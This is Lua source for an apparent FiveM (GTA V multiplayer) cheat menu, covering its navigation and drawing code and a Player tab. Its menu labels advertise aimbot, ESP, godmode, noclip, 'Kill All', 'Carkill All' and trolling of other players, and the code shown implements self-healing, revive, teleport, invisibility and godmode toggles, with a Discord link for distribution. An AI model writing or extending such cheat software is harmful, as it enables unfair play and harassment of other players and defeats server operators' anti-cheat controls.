        -- if IsDisabledControlJustReleased(0, 178) then
        --     ZM_KeyboardUI.Draw = not ZM_KeyboardUI.Draw
        -- end



        if ZM_KeyboardUI.Open then


            local actFeatures = ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature+ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll+1
            --Slider['colormenur'].value, Slider['colormenug'].value, Slider['colormenub'].value,
            ZM_KeyboardUI.DrawImage(banner, ZM_KeyboardUI.Menu.X + 159, ZM_KeyboardUI.Menu.Y - 13, 1010, 500); -- 7036

            if IsDisabledControlJustPressed(0, 173) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if actFeatures > #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options then
                    ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature = 0
                    ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll = 0
                end
                if ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature < ZM_KeyboardUI.Menu.Max then
                    ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature = ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature + 1
                else
                    if ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll < #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options-ZM_KeyboardUI.Menu.Max then
                        ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll = ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll + 1
                    end
                end
            elseif IsDisabledControlJustPressed(0, 172) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature == 1 and ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll > 0 then
                    ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll=ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll-1
                elseif ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature+(ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll-1) > 0 then
                    ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature=ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature-1
                elseif #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options > ZM_KeyboardUI.Menu.Max then
                    ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll = #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options-ZM_KeyboardUI.Menu.Max
                    ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature = #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options-ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll
                else
                    ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature = #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options
                end
            end

            if ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature <= 0 then
                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature = ZM_KeyboardUI.Menu.Max
                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll = #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options-ZM_KeyboardUI.Menu.Max
            end


            local suckmydick = #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options-ZM_KeyboardUI.Menu.Max
            local calculatedHeight = ((#ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options < ZM_KeyboardUI.Menu.Max and #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options + 1 or ZM_KeyboardUI.Menu.Max + 1)) * ZM_KeyboardUI.Menu.H * 0.68
            local calculatedY = ZM_KeyboardUI.Menu.Y + calculatedHeight/2

            ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X+ZM_KeyboardUI.Menu.W/2-2,calculatedY,ZM_KeyboardUI.Menu.W,calculatedHeight, 7, 8, 11, 220)


            -- ZM_KeyboardUI.Sprite('banner','ZM_KeyboardUI',ZM_KeyboardUI.Menu.X+123,ZM_KeyboardUI.Menu.Y-35/2-20, 250, 60,255,255,255,255)

            local calcY = calculatedY + calculatedHeight/2


            local allOptions = #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options

            local calcWidht = ZM_KeyboardUI.Menu.W * 1

            ZM_KeyboardUI.DrawText(actFeatures-1 .. "/"..allOptions, ZM_KeyboardUI.Menu.X + 5, calcY - 5, 290, 6, false, true)
            ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X+163,calcY + 5, calcWidht, 25, 0, 0, 0, 255)
            ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X+163,calcY - 7, calcWidht, 2, SliderKeyboard['colormenur'].value, SliderKeyboard['colormenug'].value, SliderKeyboard['colormenub'].value, 255)


            if allOptions >= 10 and ZM_KeyboardUI.Checkbox["scrollbar-function"] then
                local funy = ZM_KeyboardUI.Menu.Max/#ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options*calculatedHeight
                local funy1 =  ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll/#ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options * calculatedHeight

                ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X + ZM_KeyboardUI.Menu.W + 10, calculatedY, 10, calculatedHeight, 1, 1, 1, 255)
                ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X + ZM_KeyboardUI.Menu.W + 10, calculatedY - calculatedHeight / 2 + funy / 2 + funy1, 8, funy - 2, SliderKeyboard['colormenur'].value, SliderKeyboard['colormenug'].value, SliderKeyboard['colormenub'].value, 255)
            else
            if ZM_KeyboardUI.Checkbox["scrollbar-function"] then
                local funy = 5/#ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options*calculatedHeight*#ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options/5
                local funy1 =  ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll/#ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options * calculatedHeight
                ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X + ZM_KeyboardUI.Menu.W + 10, calculatedY, 10, calculatedHeight, 1, 1, 1, 255)
                ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X + ZM_KeyboardUI.Menu.W + 10, calculatedY - calculatedHeight / 2 + funy / 2 + funy1, 8, funy - 2, SliderKeyboard['colormenur'].value, SliderKeyboard['colormenug'].value, SliderKeyboard['colormenub'].value, 255)
                end
            end







            local Y = ZM_KeyboardUI.Menu.Y + ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature * ZM_KeyboardUI.Menu.H * 0.70

            if ZM_KeyboardUI.Checkbox["animation-function"] then
                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].Anim = ZM_KeyboardUI.lerp(0.085, ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].Anim, Y - 0.20)
                ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X+ZM_KeyboardUI.Menu.W/2-2,ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].Anim,ZM_KeyboardUI.Menu.W, 35-6, SliderKeyboard['colormenur'].value, SliderKeyboard['colormenug'].value, SliderKeyboard['colormenub'].value, 200)
            else
                ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X+ZM_KeyboardUI.Menu.W/2-2,Y,ZM_KeyboardUI.Menu.W, 35-6, SliderKeyboard['colormenur'].value, SliderKeyboard['colormenug'].value, SliderKeyboard['colormenub'].value, 200)
            end


            local CountOption = 0
            for k,v in pairs(ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options) do
                if k > ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll and CountOption < ZM_KeyboardUI.Menu.Max then
                    CountOption = CountOption + 1
                    local y = ZM_KeyboardUI.Menu.Y + CountOption * ZM_KeyboardUI.Menu.H * 0.70

                    if v.type == 'toggle' then
                        local x = ZM_KeyboardUI.Menu.X+ZM_KeyboardUI.Menu.W-15
                        if ZM_KeyboardUI.Checkbox[v.toggle] then
                            ZM_KeyboardUI.DrawImage(checkboxgreen, x - 10, y, 50, 40);

                          --  ZM_KeyboardUI.Sprite('circlegreen', 'circle', x - 13 , y + 12, 60, 60, 255, 255, 255, 255)
                        else
                            ZM_KeyboardUI.DrawImage(checkboxred, x - 10, y, 50, 40);

                          --  ZM_KeyboardUI.Sprite('circlered', 'circle', x - 13, y + 12, 60, 60, 255, 255, 255, 255)
                        end
                    end
                    if v.type == 'menubutton' then
                        local x = ZM_KeyboardUI.Menu.X+ZM_KeyboardUI.Menu.W-15
                      --  ZM_KeyboardUI.Sprite('arrow', 'arrow2', x, y + 45, ZM_KeyboardUI.Menu.Y-5/0.5,ZM_KeyboardUI.Menu.W-120, 255, 255, 255, 255)
                        ZM_KeyboardUI.DrawImage(arrow,x, y, ZM_KeyboardUI.Menu.Y-5/0.5,ZM_KeyboardUI.Menu.W-120);

                    end


                    if IsDisabledControlJustPressed(0, 191) and k == (actFeatures-1) then
                        if v.func then
                            PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                            CreateThread(function()
                                v.func()
                            end)
                        end

                        if v.type == 'toggle' then
                            PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", false)
                            ZM_KeyboardUI.Checkbox[v.toggle] = not ZM_KeyboardUI.Checkbox[v.toggle]
                        end
                        if v.type == 'menubutton' then
                            PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                            ZM_KeyboardUI.ActiveMenu = v.menu
                        end
                    end


                    if v.type == "slide" then




                        local calculationSlider = v.index.value / v.index.max --[[maxvalue]] * 50
                        ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X + 290, y + 5, 50, 4, 60, 60, 60, 255)
                        ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X + 270 - 50 / 10 + calculationSlider / 2, y + 5, calculationSlider, 4, 255, 255, 255, 255)
                       -- ZM_KeyboardUI.Sprite("cicrle","circleezaaa", ZM_KeyboardUI.Menu.X + 270 - 50 / 10 + calculationSlider, y + 8, 30, 30, 255,255,255,255)
                        ZM_KeyboardUI.DrawImage(circle, ZM_KeyboardUI.Menu.X + 270 - 50 / 10 + calculationSlider, y + 5, 18, 15);
                        ZM_KeyboardUI.DrawText(tostring(v.index.value),ZM_KeyboardUI.Menu.X + 235,y - 10,200,6,false, true)

                      if v.index.max <= 20 then
                            if IsDisabledControlJustPressed(0, 174) and k == (actFeatures-1)  then
                                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                                v.index.value = v.index.value - 1

                                if v.index.value > v.index.max then
                                    v.index.value = v.index.max
                                end
                                if v.index.value < v.index.min then
                                    v.index.value = v.index.min
                                end


                            elseif IsDisabledControlJustPressed(0, 175) and k == (actFeatures-1) then
                                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                                v.index.value = v.index.value + 1

                                if v.index.value > v.index.max then
                                    v.index.value = v.index.max
                                end
                                if v.index.value < v.index.min then
                                    v.index.value = v.index.min
                                end
                            end
                        else

                        if IsControlPressed(0, 174) and k == (actFeatures-1) then
                            PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                            v.index.value = v.index.value - 1

                            if v.index.value > v.index.max then
                                v.index.value = v.index.max
                            end
                            if v.index.value < v.index.min then
                                v.index.value = v.index.min
                            end

                        elseif IsControlPressed(0, 175) and k == (actFeatures-1) then
                            PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                            v.index.value = v.index.value + 1

                            if v.index.value > v.index.max then
                                v.index.value = v.index.max
                            end
                            if v.index.value < v.index.min then
                                v.index.value = v.index.min
                                end
                            end
                        end
                    end

                    if v.type == "sep" and k == (actFeatures-1) then
                        if IsControlPressed(0, 173) then
                            if actFeatures > #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options then
                                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature = 0
                                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll = 0
                            end
                            if ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature < ZM_KeyboardUI.Menu.Max then
                                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature = ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature + 1
                            else
                                if ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll < #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options-ZM_KeyboardUI.Menu.Max then
                                    ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll = ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll + 1
                                end
                            end
                        elseif IsControlPressed(0, 172) then
                            if ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature == 1 and ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll > 0 then
                                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll=ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll-1
                            elseif ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature+(ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll-1) > 0 then
                                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature=ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature-1
                            elseif #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options > ZM_KeyboardUI.Menu.Max then
                                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll = #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options-ZM_KeyboardUI.Menu.Max
                                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature = #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options-ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll
                            else
                                ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature = #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options
                            end
                        end

                        if ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature <= 0 then
                            ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].selectedFeature = ZM_KeyboardUI.Menu.Max
                            ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].scroll = #ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].options-ZM_KeyboardUI.Menu.Max
                        end
                    end

                    if v.type == "sep" then
                        ZM_KeyboardUI.DrawText(string.upper(v.text),ZM_KeyboardUI.Menu.X + 165, y-14,290,6, true, false)
                        ZM_KeyboardUI.DrawImage(sep, ZM_KeyboardUI.Menu.X + 160, y + 38, 1000, 1000); -- 7261
                    else
                        if v.type == "menubutton" then
                            ZM_KeyboardUI.DrawText(v.text,ZM_KeyboardUI.Menu.X + 5,y-11,300,6,false, false)
                        else
                            if v.type == "color" then
                                ZM_KeyboardUI.Rectangle(ZM_KeyboardUI.Menu.X + 100, y, 20, 20, 0, 0, 0, 255)
                        else
                            ZM_KeyboardUI.DrawText(v.text,ZM_KeyboardUI.Menu.X + 5,y-11,300,6,false, false)
                        end
                    end
                end
            end
        end



            if IsDisabledControlJustPressed(0, 202) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                if not ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].parent then
                    ZM_KeyboardUI.MenuToggle = not ZM_KeyboardUI.MenuToggle
                else
                    ZM_KeyboardUI.ActiveMenu = ZM_KeyboardUI.SubMenus[ZM_KeyboardUI.ActiveMenu].parent
                end
            end


        end

        end


        local function Draw()
            font.Push();
            if Winnie_IsDisabledControlJustReleased(0, oooopppppppeeeeeeeen["Value"]) then
                ZM_M1000.Draw = not ZM_M1000.Draw
            end


            if ZM_M1000.Draw and not kibind and mouseui then


            if mouseInBounds(New.x + 0.76, New.y + 0.29, 0.05, 0.03) and Winnie_IsDisabledControlJustReleased(0, 92) then
                New.active =  false
            end

            if mouseInBounds(New.x + 0.36, New.y + 0.29, 0.05, 0.03) and Winnie_IsDisabledControlJustReleased(0, 92) then
                launchwebsite("https://discord.gg/nXEskAYBnR")
            end

            load()

            Winnie_DrawRect(New2.x + 0.318, New2.y + 0.297, 0.057, 0.004, math.floor(255 * rE_Slider["Slider_colormenur_value"]),  math.floor(255 * rE_Slider["Slider_colormenug_value"]),  math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)
            Winnie_DrawRect(New.x + 0.564, New.y + 0.297, 0.4078, 0.004, math.floor(255 * rE_Slider["Slider_colormenur_value"]),  math.floor(255 * rE_Slider["Slider_colormenug_value"]),  math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)

            Winnie_DrawRect(New.x + 0.5734, New.y + 0.523, 0.0028, 0.415, math.floor(255 * rE_Slider["Slider_colormenur_value"]),  math.floor(255 * rE_Slider["Slider_colormenug_value"]),  math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)


            if ConnectToSubMenu('Player', 'Player', 0.293, 0.32, false) then
                taberino = 'Player'
            end


            Winnie_DrawText("Heal, NoClip, Godmode", New2.x + 0.293, New2.y + 0.34, false, 0.25, false, 255, 255, 255)

            if ConnectToSubMenu('Visuals', 'Visuals', 0.293, 0.38, false) then
                taberino = 'Visuals'
            end
            Winnie_DrawText("ESP, Skeleton, Line", New2.x + 0.293, New2.y + 0.40, false, 0.25, false, 255, 255, 255)


            if ConnectToSubMenu('Weapon', 'Weapon', 0.293, 0.44, false) then
                taberino = 'Weapon'
            end

            Winnie_DrawText('Aimbot, FOV, No Recoil', New2.x + 0.293, New2.y + 0.46, false, 0.25, false, 255, 255, 255)

            if ConnectToSubMenu('Vehicle', 'Vehicle', 0.293, 0.50, false) then
                taberino = 'Vehicle'
            end

            Winnie_DrawText('Custom, Speed, Jump', New2.x + 0.293, New2.y + 0.52, false, 0.25, false, 255, 255, 255)

            if ConnectToSubMenu('Online', 'Online', 0.293, 0.56, false) then
                taberino = 'Online'
            end

            Winnie_DrawText('ExpIode, Spectate, Troll', New2.x + 0.293, New2.y + 0.58, false, 0.25, false, 255, 255, 255)


            if ConnectToSubMenu('Misc', 'Misc', 0.293, 0.62, false) then
                taberino = 'Misc'
            end

            Winnie_DrawText('Kill All, Carkill All', New2.x + 0.293, New2.y + 0.64, false, 0.25, false, 255, 255, 255)


            if ConnectToSubMenu('Settings', 'Settings', 0.293, 0.68, false) then
                taberino = 'Settings'
            end


            if ConnectToSubMenu(' ', ' ', 0.305, 0.75, false) then
                taberino = 'G-Life'
            end

            Winnie_DrawText('Colors, Godmode Glife', New2.x + 0.293, New2.y + 0.70, false, 0.25, false, 255, 255, 255)





            if taberino == 'Player' then
                local player_scroll = 0.335 + New.scroll
                local scrollslider = New.scrolls
                local menu_position, menu_position_y = New.x, New.y

                if mouseInBounds(0.4 + menu_position, 0.30 + menu_position_y, 0.17, 0.45) then

                    if Winnie_IsDisabledControlPressed(0, 14)  and player_scroll >= 0.175 then
                        New.scroll = New.scroll - 0.015
                        New.scrolls = New.scrolls - 17
                    elseif Winnie_IsDisabledControlJustPressed(0, 15) and player_scroll <= 0.32 then
                        New.scroll = New.scroll + 0.015
                        New.scrolls = New.scrolls + 17
                    elseif Winnie_IsControlPressed(0, 172) and player_scroll >= 0.37 then
                        New.scroll = New.scroll - 0.015
                        New.scrolls = New.scrolls - 17
                    elseif Winnie_IsControlPressed(0, 173) and player_scroll <= 0.32 then
                        New.scroll = New.scroll + 0.015
                        New.scrolls = New.scrolls + 17
                    end


                end



                if player_scroll >= 0.335 then
                    if button("Heal", 0.415, player_scroll, true) then
                        Winnie_SetEntityHealth(Winnie_PlayerPedId(), math.floor(255 * rE_Slider["Slider_health_value"]))
                        request("Healed brother!", 3000)
                    end
                end player_scroll = player_scroll + 0.04

                if player_scroll >= 0.37 then
                    if button('['..healthkeybind["BindingTouch"].. "]", 0.45, player_scroll - 0.04) then
                        CreateThread(function()
                            local value, BindingTouch = bind()
                            healthkeybind["BindingTouch"] = BindingTouch
                            healthkeybind["Value"] = value
                        end)
                    end
                end



                if player_scroll >= 0.335 then
                    slider2(0.428, player_scroll - 0.0194, 0.08, "health", 100)
                end



                if player_scroll >= 0.37 then
                    if button('['..armorbind["BindingTouch"].. "]", 0.45, player_scroll) then
                        CreateThread(function()
                            local value, BindingTouch = bind()
                            armorbind["BindingTouch"] = BindingTouch
                            armorbind["Value"] = value
                        end)
                    end
                end

                if player_scroll >= 0.335 then
                    if button("Armor", 0.415, player_scroll, true) then
                        Winnie_SetPedArmour(Winnie_PlayerPedId(), math.floor(100 * rE_Slider["Slider_armor_value"]))
                        request("Armor Executed!", 3000)
                    end
                end player_scroll = player_scroll + 0.024



                if player_scroll >= 0.335 then
                    slider2(0.428, player_scroll, 0.08, "armor", 100)
                end player_scroll = player_scroll + 0.02



                if player_scroll >= 0.335 then
                    if button('Revive', 0.415, player_scroll, true) then
                        local coords = Winnie_GetEntityCoords(Winnie_PlayerPedId())
                        Winnie_NetworkResurrectLocalPlayer(coords, Winnie_GetEntityHeading(Winnie_PlayerPedId(), true, false))
                        Winnie_StopScreenEffect("DeathFailOut")
                        request("Revived Executed!", 3000)
                    end
                end player_scroll = player_scroll + 0.020

                if player_scroll >= 0.335 then
                    if button('['..revivebind["BindingTouch"].. "]", 0.45, player_scroll - 0.02) then
                        CreateThread(function()
                            local value, BindingTouch = bind()
                            revivebind["BindingTouch"] = BindingTouch
                            revivebind["Value"] = value
                        end)
                    end
                end

                if player_scroll >= 0.335 then
                    if button('Suicide', 0.415, player_scroll, true) then
                        Winnie_SetEntityHealth(Winnie_PlayerPedId(), 0)
                        request("Suicide Executed!", 3000)
                    end
                end player_scroll = player_scroll + 0.020

                if player_scroll >= 0.335 then
                    if button('Random Outfit', 0.415, player_scroll, true) then
                        SetPedRandomComponentVariation(Winnie_PlayerPedId(), false)
                        SetPedRandomProps(Winnie_PlayerPedId())
                        request("Random Outfit Executed!", 3000)
                    end
                end player_scroll = player_scroll + 0.020

                if player_scroll >= 0.335 then
                    if button('Teleport Waypoint', 0.415, player_scroll, true) then
                        CreateThread(function()
                            local waypoint = Winnie_GetFirstBlipInfoId(8)
                            if not Winnie_DoesBlipExist(waypoint) then
                                return
                            end
                            while Winnie_DoesBlipExist(waypoint) do
                                local coords = Winnie_GetBlipInfoIdCoord(waypoint).xy

                                for height = 1, 1000 do

                                Winnie_SetPedCoordsKeepVehicle(Winnie_PlayerPedId(), coords.x, coords.y, height + 0.0)

                                local found, height =Winnie_GetGroundZFor_3dCoord(coords.x, coords.y, height + 0.0)

                                if found then
                                    Winnie_SetPedCoordsKeepVehicle(Winnie_PlayerPedId(), coords.x, coords.y, height + 0.0)
                                    break
                                end
                                Wait(0)
                            end
                        end
                    end)
                    request("Teleport Executed!", 3000)
                end
            end player_scroll = player_scroll + 0.020

                if player_scroll >= 0.335 then
                    if button('Clear Ped Task', 0.415, player_scroll, true) then
                        Winnie_ClearPedTasksImmediately(Winnie_PlayerPedId())
                    end
                end player_scroll = player_scroll + 0.020

                if player_scroll <= 0.505 then
                    button('Wanted Player', 0.415, player_scroll, true)
                end player_scroll = player_scroll + 0.04



                if player_scroll <= 0.51 then
                    slider2(0.428, player_scroll - 0.0194, 0.08, "wantedplayer", 6)
                end

                if player_scroll <= 0.495 then
                    if button('Super Man', 0.415, player_scroll, true) then
                        local ped = Winnie_PlayerPedId()
                        local coordsPlayer = Winnie_GetEntityCoords(ped)
                        Winnie_SetEntityCoords(ped, coordsPlayer.x, coordsPlayer.y, coordsPlayer.z + 200)
                        TaskSkyDive(ped)
                    end
                end player_scroll = player_scroll + 0.020

                if player_scroll <= 0.495 then
                   if button('Player Model', 0.415, player_scroll, true) then
                    CreateThread(function()
                        if listAnimal[1] == 1 then
                            RequestModel("a_c_cat_01")
                            while not HasModelLoaded("a_c_cat_01") do
                                WAIT(0)
                            end
                            SetPlayerModel(PlayerId(), "a_c_cat_01")
                        elseif listAnimal[1] == 2 then
                            RequestModel("a_c_husky")
                            while not HasModelLoaded("a_c_husky") do
                                WAIT(0)
                            end
                            SetPlayerModel(PlayerId(), "a_c_husky")
                        elseif listAnimal[1] == 3 then
                            RequestModel("a_c_chimp")
                            while not HasModelLoaded("a_c_chimp") do
                                WAIT(0)
                            end
                            SetPlayerModel(PlayerId(), "a_c_chimp")
                        elseif listAnimal[1] == 4 then
                            RequestModel("a_c_fish")
                            while not HasModelLoaded("a_c_fish") do
                                WAIT(0)
                            end
                            SetPlayerModel(PlayerId(), "a_c_fish")
                         elseif listAnimal[1] == 5 then
                            RequestModel("a_c_sharkhammer")
                            while not HasModelLoaded("a_c_sharkhammer") do
                                WAIT(0)
                            end
                            SetPlayerModel(PlayerId(), "a_c_sharkhammer")
                        elseif listAnimal[1] == 6 then
                            RequestModel("a_c_seagull")
                            while not HasModelLoaded("a_c_seagull") do
                                WAIT(0)
                            end
                            SetPlayerModel(PlayerId(), "a_c_seagull")
                        elseif listAnimal[1] == 7 then
                            RequestModel("a_c_pig")
                            while not HasModelLoaded("a_c_pig") do
                                WAIT(0)
                            end
                            SetPlayerModel(PlayerId(), "a_c_pig")
                        end
                    end)
                end player_scroll = player_scroll + 0.035
            end




                Winnie_DrawRect(New.x + 0.38, New.y + 0.415, 0.0016, 0.18, 60, 60, 60, 255)
                Winnie_DrawRect(New.x + 0.38, New.y + 0.495 + New.scroll, 0.0016, 0.020, math.floor(255 * rE_Slider["Slider_colormenur_value"]), math.floor(255 * rE_Slider["Slider_colormenug_value"]), math.floor(255 * rE_Slider["Slider_colormenub_value"]), 255)

                if checkbox('Noclip', 0.400, 0.56, ZM_M1000.np) then
                    ZM_M1000.np = not ZM_M1000.np
                end
                if button('['..noclipbind["BindingTouch"].. "]", 0.455, 0.56) then
                    CreateThread(function()
                        local value, BindingTouch = bind()
                        noclipbind["BindingTouch"] = BindingTouch
                        noclipbind["Value"] = value

                    end)
                end
                if checkbox('Godmode', 0.400, 0.585, ZM_M1000.gd) then
                    ZM_M1000.gd = not ZM_M1000.gd
                end

                if button('['..godmodebind["BindingTouch"].. "]", 0.455, 0.585) then
                    CreateThread(function()
                        local value, BindingTouch = bind()
                        godmodebind["BindingTouch"] = BindingTouch
                        godmodebind["Value"] = value
                    end)
                end
                if checkbox('Invisible', 0.400, 0.61, ZM_M1000.ivs) then
                    ZM_M1000.ivs = not ZM_M1000.ivs
                    local numberinvisible = ZM_M1000.ivs
                        if saveconfig == true then
                            if numberinvisible == nil or numberinvisible == false then
                                SetResourceKvp("numberinvisible", "nil")
                            else
                                SetResourceKvp("numberinvisible", numberinvisible)
                            end
                        else
                            return false
                        end
                end

                if button('['..invisiblebind["BindingTouch"].. "]", 0.455, 0.61) then
                    CreateThread(function()
                        local value, BindingTouch = bind()
                        invisiblebind["BindingTouch"] = BindingTouch
                        invisiblebind["Value"] = value
                    end)
                end

                if checkbox('Fast Run', 0.400, 0.635, ZM_M1000.fst) then
                    ZM_M1000.fst = not ZM_M1000.fst
                end
                if checkbox('Stamina', 0.400, 0.66, ZM_M1000.stmn) then
                    ZM_M1000.stmn = not ZM_M1000.stmn
                    local numberstamina = ZM_M1000.stmn
                        if saveconfig == true then
                            if numberstamina == nil or numberstamina == false then
                                SetResourceKvp("numberstamina", "nil")
                            else
                                SetResourceKvp("numberstamina", numberstamina)
                            end
                        else
                            return false
                        end
                end
                if checkbox('No Collision', 0.400, 0.685, ZM_M1000.ncl) then
                    ZM_M1000.ncl = not ZM_M1000.ncl
                end
                if checkbox('Auto-Health', 0.400, 0.71, ZM_M1000.authl) then
                    ZM_M1000.authl = not ZM_M1000.authl
                end

                if checkbox('Fake Dead', 0.510, 0.56, ZM_M1000.fkd) then
                    ZM_M1000.fkd = not ZM_M1000.fkd
                end
                if checkbox('Fast Swim', 0.510, 0.585, ZM_M1000.fstswin) then
                    ZM_M1000.fstswin = not ZM_M1000.fstswin
                end
